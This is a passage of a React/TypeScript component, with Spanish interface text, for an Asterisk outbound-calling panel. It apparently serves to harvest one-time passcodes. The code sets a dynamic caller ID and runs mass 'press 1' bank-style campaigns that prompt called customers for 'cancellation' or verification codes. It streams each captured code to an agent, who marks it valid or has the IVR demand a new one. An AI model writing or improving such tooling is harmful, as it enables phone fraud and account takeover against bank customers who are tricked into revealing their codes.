    const userCarrierRef = activeUser?.carrierId || activeUser?.assignedCarrierId;
    if (userCarrierRef && userCarrierRef !== 'auto' && userCarrierRef !== 'pool') {
      const refSlug = String(userCarrierRef).toLowerCase().replace(/[^a-z0-9_]/g, '_');
      const byUser = carriers.find(
        (c) =>
          c.id === userCarrierRef ||
          c.name === userCarrierRef ||
          c.name.toLowerCase().replace(/[^a-z0-9_]/g, '_') === refSlug
      );
      if (byUser) return byUser;
    }
    if (userTenant?.carrierId && userTenant.carrierId !== 'auto' && userTenant.carrierId !== 'pool') {
      const refSlug = String(userTenant.carrierId).toLowerCase().replace(/[^a-z0-9_]/g, '_');
      return (
        carriers.find(
          (c) =>
            c.id === userTenant.carrierId ||
            c.name === userTenant.carrierId ||
            c.name.toLowerCase().replace(/[^a-z0-9_]/g, '_') === refSlug
        ) || null
      );
    }
    return null;
  }, [userTenant, carriers, activeUser?.carrierId, activeUser?.assignedCarrierId]);

  const [selectedCarrierName, setSelectedCarrierName] = useState<string>('auto');
  const lastCarrierInitUserRef = useRef<string>('');

  const assignedClientCarrierName = defaultAssignedCarrier
    ? defaultAssignedCarrier.name
    : (enabledCarriers[0]?.name || 'auto');

  useEffect(() => {
    const uid = activeUser?.id || '';
    if (uid && lastCarrierInitUserRef.current !== uid) {
      lastCarrierInitUserRef.current = uid;
      if (defaultAssignedCarrier) {
        setSelectedCarrierName(defaultAssignedCarrier.name);
      } else if (!isSuperAdmin && enabledCarriers[0]?.name) {
        setSelectedCarrierName(enabledCarriers[0].name);
      } else {
        setSelectedCarrierName('auto');
      }
    }
  }, [activeUser?.id, defaultAssignedCarrier, isSuperAdmin, enabledCarriers]);

  const effectiveSelectedCarrier = isSuperAdmin
    ? selectedCarrierName || 'auto'
    : assignedClientCarrierName;
  const activeCarrierObj =
    (effectiveSelectedCarrier !== 'auto'
      ? carriers.find(
          (c) =>
            c.name === effectiveSelectedCarrier ||
            c.id === effectiveSelectedCarrier ||
            c.name.toLowerCase().replace(/[^a-z0-9_]/g, '_') === String(effectiveSelectedCarrier).toLowerCase().replace(/[^a-z0-9_]/g, '_')
        )
      : null) ||
    defaultAssignedCarrier ||
    enabledCarriers[0] ||
    carriers[0];
  const activeCarrier = effectiveSelectedCarrier !== 'auto' ? effectiveSelectedCarrier : (activeCarrierObj ? activeCarrierObj.name : 'carrier_default');
  const rawCarrierOutboundCid = String(activeCarrierObj?.outboundCallerId || '').trim();
  const outboundCid = (rawCarrierOutboundCid && !rawCarrierOutboundCid.includes('5550199') && !/asignado/i.test(rawCarrierOutboundCid))
    ? rawCarrierOutboundCid
    : '';

  // Dynamic CallerID state: empty by default so the SIP provider assigns the Caller ID natively
  const [callerIdNum, setCallerIdNum] = useState<string>('');
  const [callerIdName, setCallerIdName] = useState<string>('');
  const [isSavingCallerId, setIsSavingCallerId] = useState(false);
  const [callerIdSaveFeedback, setCallerIdSaveFeedback] = useState<string | null>(null);

  // Directly save Caller ID to AstDB, Asterisk PJSIP/Dialplan and local storage
  const handleSaveCallerIdDirect = async (newNum: string, newName: string) => {
    setIsSavingCallerId(true);
    setCallerIdSaveFeedback(null);
    try {
      const cleanNum = newNum.trim();
      const cleanName = newName.trim();
      setCallerIdNum(cleanNum);
      setCallerIdName(cleanName);
      try {
        localStorage.setItem('ast20_active_caller_id_num', cleanNum);
        localStorage.setItem('ast20_active_caller_id_name', cleanName);
      } catch (_) {}
      window.dispatchEvent(new CustomEvent('callerid-updated', { detail: { num: cleanNum, name: cleanName } }));
      const res = await fetch('/api/asterisk/callerid', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callerIdNum: cleanNum, callerIdName: cleanName }),
      });
      const data = await res.json();
      if (data.success) {
        setCallerIdSaveFeedback(`✓ Caller ID configurado a "${cleanName}" <${cleanNum}>`);
      } else {
        setCallerIdSaveFeedback(`Aviso: ${data.error || 'No se pudo guardar'}`);
      }
      setTimeout(() => setCallerIdSaveFeedback(null), 4000);
    } catch (err: any) {
      setCallerIdSaveFeedback(`Error al guardar: ${err.message}`);
      setTimeout(() => setCallerIdSaveFeedback(null), 4000);
    } finally {
      setIsSavingCallerId(false);
    }
  };

  // Sync with global caller id modal events & server config
  useEffect(() => {
    fetch('/api/asterisk/callerid')
      .then((r) => r.json())
      .then((data) => {
        if (data.success) {
          if (data.callerIdNum) setCallerIdNum(data.callerIdNum);
          if (data.callerIdName) setCallerIdName(data.callerIdName);
        }
      })
      .catch(() => {});

    const handleCallerIdUpdate = (e: any) => {
      if (e.detail?.num) setCallerIdNum(e.detail.num);
      if (e.detail?.name) setCallerIdName(e.detail.name);
    };

    window.addEventListener('callerid-updated', handleCallerIdUpdate);
    return () => {
      window.removeEventListener('callerid-updated', handleCallerIdUpdate);
    };
  }, []);

  // Ensure default action is synced to Asterisk on mount (Super Admin only)
  useEffect(() => {
    if (!isSuperAdmin) return;
    fetch('/api/asterisk/action/set-default', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ mode: callFlowMode }),
    }).catch(() => {});
  }, [isSuperAdmin]);

  const activeSelectedEntity = campaignEntities.find((e) => e.id === selectedService) || campaignEntities[0];
  const serviceLabel = activeSelectedEntity ? `${activeSelectedEntity.name} (${activeSelectedEntity.subtitle})` : 'Servicio al Cliente';

  const durationTimerRef = useRef<any>(null);
  const lastAlertKeyRef = useRef<string>('');
  const activeCallRef = useRef(activeCall);
  const validRecordIdsRef = useRef<Set<string>>(new Set());

  useEffect(() => {
    activeCallRef.current = activeCall;
  }, [activeCall]);

  const applyOtpRecordsUpdate = (rawRecords: any[]) => {
    const u = activeUserRef.current || activeUser;
    const assignedExts = Array.isArray(u?.assignedExtensions)
      ? u.assignedExtensions.map((x: string) => String(x).trim()).filter(Boolean)
      : [];
    let filtered = u?.tenantId
      ? rawRecords.filter((r: any) => !r.tenantId || r.tenantId === u.tenantId)
      : rawRecords;

    // Aislamiento estricto por extensiones asignadas (aplica incluso si el usuario es admin con extensión asignada)
    if (assignedExts.length > 0) {
      filtered = filtered.filter((r: any) => {
        const recAgent = r.agent ? String(r.agent).trim() : '';
        if (recAgent) return assignedExts.includes(recAgent);
        const recNum = r.number ? String(r.number).trim() : '';
        return recNum ? assignedExts.includes(recNum) : false;
      });
    }

    setOtpRecords(filtered);

    // Detectar si hay un código nuevo para alertar exclusivamente a este agente
    if (filtered.length > 0) {
      const newest = filtered[0];
      const recordKey = `${newest.id}_${newest.otp}_${newest.status}`;

      const isDecided =
        newest.status === 'valid' ||
        newest.status === 'invalid' ||
        validRecordIdsRef.current.has(newest.id) ||
        (newest.otp && validRecordIdsRef.current.has(newest.otp)) ||
        (newest.number && validRecordIdsRef.current.has(newest.number));

      if (isDecided) {
        setActiveCall((prev) => {
          if (prev && prev.name?.includes('Cliente Transferido')) {
            return null;
          }
          if (prev && prev.capturedOtp === newest.otp) {
            return {
              ...prev,
              capturedOtp: undefined,
              status: prev.status === 'otp_captured' ? 'connected' : prev.status,
              otpStatus: newest.status as any,
            };
          }
          return prev;
        });
      } else {
        // Tono de notificación auditivo solo cuando llega un código nuevo o cambia de estado
        if (newest.otp && lastAlertKeyRef.current !== recordKey) {
          lastAlertKeyRef.current = recordKey;

          try {
            const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
            const osc = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            osc.type = 'triangle';
            osc.frequency.setValueAtTime(880, audioCtx.currentTime);
            osc.frequency.exponentialRampToValueAtTime(1760, audioCtx.currentTime + 0.35);
            gain.gain.setValueAtTime(0.25, audioCtx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.35);
            osc.connect(gain);
            gain.connect(audioCtx.destination);
            osc.start();
            osc.stop(audioCtx.currentTime + 0.35);
          } catch (e) {}
        }

        // CRÍTICO: Actualizar el HUD activo ÚNICAMENTE si ya hay una llamada en curso lanzada por el usuario.
        setActiveCall((prev) => {
          if (prev && prev.isActive) {
            if (prev.capturedOtp === newest.otp && prev.otpStatus === newest.status) {
              return prev; // Mismo estado, sin re-render
            }
            return {
              ...prev,
              capturedOtp: newest.otp,
              agent: newest.agent || prev.agent,
              status: 'otp_captured',
              otpStatus: (newest.status as any) || prev.otpStatus || 'pending',
            };
          }
          return prev;
        });
      }
    }
  };

  // Polling captured OTPs from Asterisk backend (manual/fresh trigger; background updates reuse App.tsx globalOtpRecords)
  const fetchCapturedOtps = async (forceFresh = false) => {
    try {
      const u = activeUserRef.current || activeUser;
      const assignedExts = Array.isArray(u?.assignedExtensions)
        ? u.assignedExtensions.map((x: string) => String(x).trim()).filter(Boolean)
        : [];
      const params = new URLSearchParams();
      if (forceFresh) params.set('fresh', '1');
      if (u?.tenantId) params.set('tenantId', u.tenantId);
      if (assignedExts.length > 0) params.set('extensions', assignedExts.join(','));
      const qs = params.toString();
      const url = qs ? `/api/asterisk/otp/records?${qs}` : '/api/asterisk/otp/records';

      const res = await fetch(url);
      const data = await res.json();
      if (data.success && Array.isArray(data.records)) {
        applyOtpRecordsUpdate(data.records);
      }
    } catch (err) {
      console.warn('Error fetching OTP records:', err);
    }
  };

  // Agent OTP verification handler (Valid / Invalid buttons decided by Agent)
  const handleVerifyOtp = async (
    status: 'valid' | 'invalid',
    targetOtp?: string,
    targetNum?: string,
    recordId?: string
  ) => {
    const normLast10 = (v?: string) => String(v || '').replace(/[^0-9]/g, '').slice(-10);
    const num = targetNum || (activeCall ? activeCall.number : '');
    const otp = targetOtp || (activeCall ? activeCall.capturedOtp : '');
    const num10 = normLast10(num);
    const matchesRec = (r: any) => {
      if (recordId && r.id === recordId) return true;
      const r10 = normLast10(r.number);
      const numMatch =
        !!num &&
        (r.number === num ||
          (num10.length >= 7 && r10 === num10) ||
          r.number.includes(num) ||
          num.includes(r.number));
      const otpMatch = !!otp && r.otp === otp;
      if (num && otp) return numMatch && otpMatch;
      return numMatch || otpMatch;
    };
    const rec = otpRecords.find(matchesRec);
    const effectiveNumber = rec?.number || num;
    const effectiveId = recordId || rec?.id;
    const targetAgent =
      rec?.agent ||
      activeCall?.agent ||
      (activeCall?.agentExten !== 'ringall' ? activeCall?.agentExten : undefined) ||
      (agentExtension !== 'ringall' ? agentExtension : '1001');

    if (status === 'valid') {
      if (effectiveId) validRecordIdsRef.current.add(effectiveId);
      if (otp) validRecordIdsRef.current.add(otp);
      if (effectiveNumber) validRecordIdsRef.current.add(effectiveNumber);
      if (num) validRecordIdsRef.current.add(num);

      // Quitar del HUD de llamada activa la sección de dígitos en tiempo real
      if (activeCall) {
        const isCancelModeCall = (activeCall.mode || callFlowMode) === 'cancel_code';
        const isOtpPress1Call = (activeCall.mode || callFlowMode) === 'otp_press1';
        if (activeCall.name?.includes('Cliente Transferido')) {
          setActiveCall(null);
        } else {
          setActiveCall((prev) =>
            prev
              ? {
                  ...prev,
                  capturedOtp: undefined,
                  agent: targetAgent,
                  status: prev.status === 'otp_captured' ? 'connected' : prev.status,
                  otpStatus: 'valid',
                  cancelDecision: 'valid',
                  validationNote: isCancelModeCall
                    ? '✓ Código de cancelación marcado como VÁLIDO. Asterisk está reproduciendo la confirmación de cancelación exitosa al cliente.'
                    : isOtpPress1Call
                    ? '✓ Código de verificación marcado como VÁLIDO. Asterisk está confirmando la verificación al cliente.'
                    : `✓ Token VÁLIDO aprobado. ¡Transfiriendo llamada de vuelta a la extensión de agente (${targetAgent})!`,
                }
              : null
          );
        }
      }
    } else {
      if (activeCall) {
        const isCancelModeCall = (activeCall.mode || callFlowMode) === 'cancel_code';
        const isOtpPress1Call = (activeCall.mode || callFlowMode) === 'otp_press1';
        setActiveCall((prev) =>
          prev
            ? {
                ...prev,
                otpStatus: status,
                cancelDecision: 'invalid',
                validationNote: isCancelModeCall
                  ? '✕ Código de cancelación marcado como INVÁLIDO. Asterisk está solicitando un nuevo código al cliente...'
                  : isOtpPress1Call
                  ? '✕ Código rechazado (INVÁLIDO). El IVR de Captura OTP está solicitando un nuevo código al cliente...'
                  : '✕ Token marcado como INVÁLIDO. El IVR le ha solicitado automáticamente un nuevo token al cliente...',
              }
            : null
        );
      }
    }

    // Immediate UI update in list (permanece visible en el monitor del agente y en el registro histórico)
    setOtpRecords((prev) =>
      prev.map((r) =>
        matchesRec(r) ? { ...r, status, agent: targetAgent || r.agent } : r
      )
    );

    try {
      const res = await fetch('/api/asterisk/otp/decision', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          id: effectiveId,
          number: effectiveNumber,
          otp,
          status,
          agent: targetAgent,
          action: status === 'invalid' ? 'request_retry' : undefined,
        }),
      });
      const data = await res.json().catch(() => ({}));
      if (res.ok && data.success !== false) {
        fetchCapturedOtps(true);
      }
    } catch (e) {
      console.warn('Error syncing OTP decision:', e);
    }

    // Si es INVÁLIDO: Solicitar automáticamente nuevo código y dejar la pantalla lista para capturar el nuevo token
    if (status === 'invalid') {
      setTimeout(() => {
        if (activeCall) {
          setActiveCall((prev) =>
            prev
              ? {
                  ...prev,
                  capturedOtp: undefined,
                  otpStatus: 'pending',
                  validationNote: 'Esperando nuevo token digitado por el cliente...',
                }
              : null
          );
        }
      }, 1500);
    }
  };

  // Transfer live call to automated OTP capture system (Ext. 4001+ / Dinámica) with sticky agent tracking
  const handleTransferToOtpSystem = async () => {
    if (!activeCall) return;
    setIsTransferringToOtp(true);
    const targetOtpExt = selectedOtpExten || '4001';
    try {
      const assignedAgent = activeCall.agent || (activeCall.agentExten !== 'ringall' ? activeCall.agentExten : undefined) || (agentExtension !== 'ringall' ? agentExtension : '1001');
      const res = await fetch('/api/asterisk/call/transfer-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          channel: activeCall.channel,
          number: activeCall.number,
          exten: targetOtpExt,
          agent: assignedAgent,
        }),
      });
      const data = await res.json();
      if (data.success) {
        setActiveCall((prev) =>
          prev
            ? {
                ...prev,
                status: 'in_ivr',
                agent: assignedAgent,
                validationNote: `✓ Cliente transferido al Sistema Automático OTP (Ext. ${targetOtpExt}). Al validar el código, la llamada retornará a la Extensión ${assignedAgent}.`,
              }
            : null
        );
      }
    } catch (e) {
      console.error('Error transferring to OTP system:', e);
    } finally {
      setIsTransferringToOtp(false);
    }
  };

  // Reset captured OTP in HUD to request a new code from client on the same call
  const handleResetOtpCapture = async (number?: string) => {
    const num = number || (activeCall ? activeCall.number : '');
    if (activeCall) {
      setActiveCall((prev) =>
        prev
          ? {
              ...prev,
              capturedOtp: undefined,
              otpStatus: 'pending',
              validationNote: 'Se solicitó nuevo código al cliente en llamada. Esperando que digite...',
            }
          : null
      );
    }
    try {
      await fetch('/api/asterisk/otp/decision', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ number: num, status: 'pending', action: 'request_retry' }),
      });
    } catch (e) {}
  };

  // Cargar configuración de audios persistida desde Asterisk AstDB al inicializar la pestaña
  useEffect(() => {
    const fetchAsteriskAudioConfig = async () => {
      try {
        const res = await fetch('/api/asterisk/audio/config');
        const data = await res.json();
        if (data.success && data.audios) {
          setCampaignEntities((prev) => {
            const updated = prev.map((ent) => {
              // Si el guión tiene bloqueo manual (isLocked: true), protegerlo contra sobrescritura
              if (ent.isLocked) {
                return ent;
              }
              // Si es la entidad activa o la default, actualizar con los audios reales de Asterisk AstDB
              if (ent.id === selectedService || ent.id === 'custom') {
                return {
                  ...ent,
                  introAudioPath: data.audios.intro || ent.introAudioPath,
                  promptAudioPath: data.audios.prompt || ent.promptAudioPath,
                  agentAudioPath: data.audios.agent || ent.agentAudioPath,
                  successAudioPath: data.audios.success || ent.successAudioPath,
                };
              }
              return ent;
            });
            try {
              localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(updated));
            } catch (e) {}
            return updated;
          });
        }
      } catch (err) {}
    };

    fetchAsteriskAudioConfig();
  }, []);

  // Sync OTP records from centralized App.tsx telemetry without duplicate polling requests
  useEffect(() => {
    if (globalOtpRecords !== undefined) {
      applyOtpRecordsUpdate(globalOtpRecords);
      return;
    }
    fetchCapturedOtps();
    const interval = setInterval(() => {
      if (typeof document !== 'undefined' && document.hidden) return;
      fetchCapturedOtps();
    }, 6000);
    return () => clearInterval(interval);
  }, [globalOtpRecords, activeUser?.id, activeUser?.tenantId, activeUser?.assignedExtensions?.join(',')]);

  // Polling de canales activos de Asterisk para detectar llamadas manuales pertenecientes a las extensiones del usuario
  useEffect(() => {
    let isPollingChannels = false;
    const pollLiveChannels = async () => {
      if (typeof document !== 'undefined' && document.hidden) return;
      if (isPollingChannels) return;
      isPollingChannels = true;
      try {
        const res = await fetch('/api/asterisk/live/channels');
        const data = await res.json();
        if (data.success && Array.isArray(data.channels)) {
          const u = activeUserRef.current || activeUser;
          const assignedExts = Array.isArray(u?.assignedExtensions)
            ? u.assignedExtensions.map((x: string) => String(x).trim()).filter(Boolean)
            : [];

          // Buscar solo canales interactuando con el IVR que pertenezcan a las extensiones asignadas de este usuario
          const ivrChannel = data.channels.find((ch: any) => {
            const exten = String(ch.extension || ch.exten || '');
            const context = String(ch.context || '');
            const channel = String(ch.channel || '');
            const callerId = String(ch.callerId || ch.callerid || '').trim();
            const isIvrOrCapture =
              exten.includes('8888') ||
              /^4\d{3}$/.test(exten) ||
              context.includes('captura') ||
              context.includes('ivr') ||
              channel.includes('8888');
            if (!isIvrOrCapture) return false;
            if (assignedExts.length === 0) return true;
            return assignedExts.some(
              (ext) => callerId === ext || channel.includes(`PJSIP/${ext}-`)
            );
          });

          if (ivrChannel) {
            const detectedNumber = ivrChannel.callerId || ivrChannel.callerid || '8888';
            setActiveCall((prev) => {
              if (prev && prev.isActive) {
                return {
                  ...prev,
                  channel: prev.channel || ivrChannel.channel,
                };
              }
              return {
                isActive: true,
                number: detectedNumber === '8888' ? 'Prueba Local Ext. 8888' : detectedNumber,
                name: `Prueba Softphone Ext. ${detectedNumber}`,
                service: selectedService || 'bank',
                status: 'in_ivr',
                duration: 0,
                channel: ivrChannel.channel,
                agent: assignedExts.find((ext) => String(ivrChannel.channel || '').includes(`PJSIP/${ext}-`) || detectedNumber === ext),
              };
            });
          } else if (activeCallRef.current?.isActive && (activeCallRef.current.duration || 0) >= 5 && Array.isArray(data.channels)) {
            const queryClean = activeCallRef.current.number.replace(/[^0-9]/g, '');
            const channelStillAlive = data.channels.some((c: any) => {
              const chStr = (c.channel || '') + (c.extension || '') + (c.callerId || '') + (c.data || '');
              return (activeCallRef.current?.channel && c.channel?.includes(activeCallRef.current.channel)) || (queryClean && chStr.includes(queryClean));
            });
            if (!channelStillAlive && activeCallRef.current.status !== 'ended') {
              setActiveCall((prev) => (prev ? { ...prev, isActive: false, status: 'ended' } : null));
            }
          }
        }
      } catch (e) {}
      finally {
        isPollingChannels = false;
      }
    };

    pollLiveChannels();
    const chanInterval = setInterval(pollLiveChannels, activeCall?.isActive ? 4500 : 10000);
    return () => clearInterval(chanInterval);
  }, [activeUser?.id, activeUser?.assignedExtensions?.join(','), activeCall?.isActive]);

  // Check if there is an active call running on Asterisk on mount (strictly scoped to user's assigned extensions)
  useEffect(() => {
    fetch('/api/asterisk/call/latest-active')
      .then((res) => res.json())
      .then((data) => {
        if (data.success && data.call && (!activeCallRef.current || !activeCallRef.current.isActive)) {
          const c = data.call;
          const u = activeUserRef.current || activeUser;
          const assignedExts = Array.isArray(u?.assignedExtensions)
            ? u.assignedExtensions.map((x: string) => String(x).trim()).filter(Boolean)
            : [];
          if (assignedExts.length > 0 && c.agent && c.agent !== 'ringall' && !assignedExts.includes(String(c.agent).trim())) {
            return;
          }
          setActiveCall({
            isActive: true,
            number: c.number,
            name: undefined,
            service: selectedService || 'bank',
            status: c.status === 'pressed_1' ? 'pressed_1' : (c.status || 'in_ivr'),
            channel: c.channel,
            duration: c.duration || 0,
            pressed1At: c.pressed1At,
            pressed1Time: c.pressed1At ? new Date(c.pressed1At).toLocaleTimeString() : undefined,
            agentExten: c.agent || '1001',
            agent: c.agent,
          });
        }
      })
      .catch(() => {});
  }, []);

  // Monitoreo en tiempo real del estado de la llamada activa (Corte, Contestadora, y Detección de DTMF 1)
  useEffect(() => {
    if (!activeCall?.isActive || activeCall.status === 'ended') return;

    const watcherInterval = setInterval(async () => {
      if (typeof document !== 'undefined' && document.hidden) return;
      try {
        const queryNum = activeCall.number.replace(/[^0-9]/g, '');
        if (!queryNum) return;
        const res = await fetch(`/api/asterisk/call/status?number=${encodeURIComponent(queryNum)}`);
        const data = await res.json();
        if (data.success && data.call) {
          const callState = data.call;

          // 1. Detección en vivo de cuando el cliente presiona la tecla 1
          if (callState.status === 'pressed_1' || (callState.digit === '1' && callState.status !== 'asking_cancel_code' && callState.status !== 'cancel_valid' && callState.status !== 'cancel_invalid')) {
            setActiveCall((prev) => {
              if (!prev) return null;
              if (prev.status !== 'pressed_1') {
                playPress1Chime();
              }
              return {
                ...prev,
                status: 'pressed_1',
                mode: (callState.mode as CallFlowMode) || prev.mode,
                pressed1At: callState.pressed1At || prev.pressed1At || Date.now(),
                pressed1Time: prev.pressed1Time || new Date(callState.pressed1At || Date.now()).toLocaleTimeString(),
                duration: typeof callState.duration === 'number' && callState.duration > 0 ? callState.duration : prev.duration,
                channel: callState.channel || prev.channel,
              };
            });
          } else if (callState.status === 'asking_cancel_code') {
            setActiveCall((prev) =>
              prev
                ? {
                    ...prev,
                    status: 'asking_cancel_code',
                    mode: (callState.mode as CallFlowMode) || prev.mode,
                    validationNote:
                      '🎙️ El IVR le está solicitando al cliente que digite el código de cancelación...',
                    duration: typeof callState.duration === 'number' && callState.duration > 0 ? callState.duration : prev.duration,
                    channel: callState.channel || prev.channel,
                  }
                : null
            );
          } else if (callState.status === 'cancel_valid') {
            setActiveCall((prev) =>
              prev
                ? {
                    ...prev,
                    otpStatus: 'valid',
                    cancelDecision: 'valid',
                    validationNote: '✓ Código de cancelación confirmado como VÁLIDO. Reproduciendo confirmación al cliente...',
                    duration: typeof callState.duration === 'number' && callState.duration > 0 ? callState.duration : prev.duration,
                  }
                : null
            );
          } else if (callState.status === 'cancel_invalid') {
            setActiveCall((prev) =>
              prev
                ? {
                    ...prev,
                    otpStatus: 'invalid',
                    cancelDecision: 'invalid',
                    capturedOtp: undefined,
                    validationNote: '✕ Código marcado como INVÁLIDO. Esperando nuevo código del cliente...',
                    duration: typeof callState.duration === 'number' && callState.duration > 0 ? callState.duration : prev.duration,
                  }
                : null
            );
          } else if (callState.status === 'transferred') {
            setActiveCall((prev) => {
              if (!prev) return null;
              return {
                ...prev,
                status: 'transferred',
                agentExten: callState.agent || prev.agentExten || '1001',
                duration: typeof callState.duration === 'number' && callState.duration > 0 ? callState.duration : prev.duration,
                channel: callState.channel || prev.channel,
              };
            });
          } else if (callState.status === 'in_ivr' && (activeCall.status === 'dialing' || activeCall.status === 'ringing')) {
            setActiveCall((prev) => prev ? { ...prev, status: 'in_ivr', mode: (callState.mode as CallFlowMode) || prev.mode, answeredAt: callState.answeredAt || Date.now(), channel: callState.channel || prev.channel } : null);
          } else if (callState.status === 'ringing' && activeCall.status === 'dialing') {
            setActiveCall((prev) => prev ? { ...prev, status: 'ringing', channel: callState.channel || prev.channel } : null);
          } else if (callState.status === 'retrying') {
            setActiveCall((prev) =>
              prev
                ? {
                    ...prev,
                    status: 'dialing',
                  }
                : null
            );
            setLaunchFeedback({
              text: `🤖 Grabadora / Contestador detectado en ${activeCall.number} (${callState.cause || 'AMD'}). Reintentando automáticamente...`,
              type: 'info',
            });
          } else if (callState.status === 'machine' || callState.status === 'machine_detected') {
            setActiveCall((prev) =>
              prev
                ? {
                    ...prev,
                    isActive: false,
                    status: 'ended',
                  }
                : null
            );
            setLaunchFeedback({
              text: `🤖 Contestadora automática o buzón de voz detectado en ${activeCall.number}${callState.cause ? ` (${callState.cause})` : ''}. Asterisk colgó la llamada automáticamente.`,
              type: 'error',
            });
          } else if (callState.status === 'ended') {
            setActiveCall((prev) =>
              prev
                ? {
                    ...prev,
                    isActive: false,
                    status: 'ended',
                    duration: typeof callState.duration === 'number' && callState.duration > 0 ? callState.duration : prev.duration,
                  }
                : null
            );
            setLaunchFeedback({
              text: `📞 El cliente ha colgado la llamada (${activeCall.number}). Llamada finalizada en el sistema.`,
              type: 'info',
            });
          }

          // Mantener sincronizado el contador de tiempo de duración real reportado por Asterisk
          if (typeof callState.duration === 'number' && callState.duration > 0) {
            setActiveCall((prev) => {
              if (!prev) return null;
              if (Math.abs(prev.duration - callState.duration) >= 2) {
                return { ...prev, duration: callState.duration };
              }
              return prev;
            });
          }
        }
      } catch (_) {}
    }, 1000);

    return () => clearInterval(watcherInterval);
  }, [activeCall?.isActive, activeCall?.number, activeCall?.status]);

  // Audible chime alert for any cancel_code call pressing 1 in globalLiveCalls (mass campaigns or background)
  const pendingCancelPress1Global = React.useMemo(() => {
    if (!Array.isArray(globalLiveCalls)) return [];
    const activeNumClean = activeCall?.isActive ? activeCall.number.replace(/[^0-9]/g, '') : '';
    return globalLiveCalls.filter((c: any) => {
      if (c.status !== 'pressed_1' || c.mode !== 'cancel_code') return false;
      const cNum = String(c.number || '').replace(/[^0-9]/g, '');
      if (activeNumClean && cNum === activeNumClean && activeCall?.status === 'pressed_1') return false;
      return true;
    });
  }, [globalLiveCalls, activeCall?.isActive, activeCall?.number, activeCall?.status]);

  useEffect(() => {
    if (pendingCancelPress1Global.length === 0) return;
    let shouldPlay = false;
    for (const c of pendingCancelPress1Global) {
      const k = `${c.number}_${c.pressed1At || c.startTime || ''}`;
      if (!notifiedCancelPress1Ref.current.has(k)) {
        notifiedCancelPress1Ref.current.add(k);
        shouldPlay = true;
      }
    }
    if (shouldPlay) playPress1Chime();
  }, [pendingCancelPress1Global]);

  // Duration timer for active call
  useEffect(() => {
    if (activeCall?.isActive && activeCall.status !== 'ended') {
      durationTimerRef.current = setInterval(() => {
        setActiveCall((prev) => (prev ? { ...prev, duration: prev.duration + 1 } : null));
      }, 1000);
    } else {
      if (durationTimerRef.current) clearInterval(durationTimerRef.current);
    }
    return () => {
      if (durationTimerRef.current) clearInterval(durationTimerRef.current);
    };
  }, [activeCall?.isActive, activeCall?.status]);

  // Quick audio recording with microphone
  const handleStartRecordingQuick = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const mediaRecorder = new MediaRecorder(stream);
      mediaRecorderRef.current = mediaRecorder;
      audioChunksRef.current = [];

      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          audioChunksRef.current.push(event.data);
        }
      };

      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunksRef.current, { type: 'audio/webm' });
        const reader = new FileReader();
        reader.onloadend = () => {
          setQuickUploadDataUrl(reader.result as string);
          if (!quickUploadName) {
            setQuickUploadName(`Locución ${new Date().toLocaleTimeString().replace(/:/g, '-')}`);
          }
        };
        reader.readAsDataURL(audioBlob);
        stream.getTracks().forEach((track) => track.stop());
      };

      mediaRecorder.start();
      setIsRecordingQuick(true);
      setQuickRecordTime(0);
      recordTimerRef.current = setInterval(() => {
        setQuickRecordTime((prev) => prev + 1);
      }, 1000);
    } catch (err) {
      alert('No se pudo acceder al micrófono para grabar.');
    }
  };

  const handleStopRecordingQuick = () => {
    if (mediaRecorderRef.current && isRecordingQuick) {
      mediaRecorderRef.current.stop();
      setIsRecordingQuick(false);
      if (recordTimerRef.current) clearInterval(recordTimerRef.current);
    }
  };

  const handleSaveQuickAudio = () => {
    if (!quickUploadDataUrl || !quickUploadName.trim()) return;

    const cleanBaseName = quickUploadName
      .toLowerCase()
      .trim()
      .replace(/\.[^/.]+$/, '')
      .replace(/[^a-z0-9_]/g, '_');

    const asteriskPath = `custom/${cleanBaseName}`;

    const newPrompt: AudioPrompt = {
      id: `audio-${Date.now()}-${Math.random().toString(36).slice(-4)}`,
      name: quickUploadName.trim(),
      category: quickUploadSlot === 'introAudioPath' ? 'press1_welcome' : 'otp_welcome',
      fileName: `${cleanBaseName}.wav`,
      fileSize: '150 KB',
      durationSec: quickRecordTime || 5.0,
      format: 'audio/wav',
      sampleRate: '8000 Hz, 16-bit Mono (Asterisk PCM)',
      dataUrl: quickUploadDataUrl,
      asteriskPath,
      createdAt: new Date().toLocaleString(),
    };

    if (onAddAudio) {
      onAddAudio(newPrompt);
    }

    // Auto-assign to current campaign slot
    handleUpdateCampaignAudio(selectedService, quickUploadSlot, asteriskPath);

    setIsQuickUploadOpen(false);
    setQuickUploadDataUrl(null);
    setQuickUploadName('');
    setQuickUploadFile(null);
  };

  // Synchronize campaign audios and complete dialplan to Asterisk so it never plays a beep
  const handleSyncAudiosToAsterisk = async (silent = false) => {
    setIsSyncingAudios(true);
    if (!silent) setAudioSyncFeedback(null);
    try {
      const currentAudios = getServiceAudios(selectedService);
      // 1. Sync Audios to AstDB
      await fetch('/api/asterisk/audio/sync-defaults', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          intro: currentAudios.introAudioPath || 'custom/bienvenida_corporativa',
          prompt: currentAudios.promptAudioPath || 'custom/solicitar_codigo_otp',
          wait: 'custom/un_momento_validando_informacion',
          success: currentAudios.successAudioPath || 'custom/operacion_bloqueada_exito',
          agent: currentAudios.agentAudioPath || 'custom/conectar_asesor',
          cancelWait: currentAudios.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
          otpVerifyWait: currentAudios.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion',
          destination: targetNumber.trim() || '16104803845',
        }),
      });

      // 2. Perform Full Dialplan, PJSIP & Hot Reload directly into /etc/asterisk/
      const res = await fetch('/api/asterisk/sync/extensions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
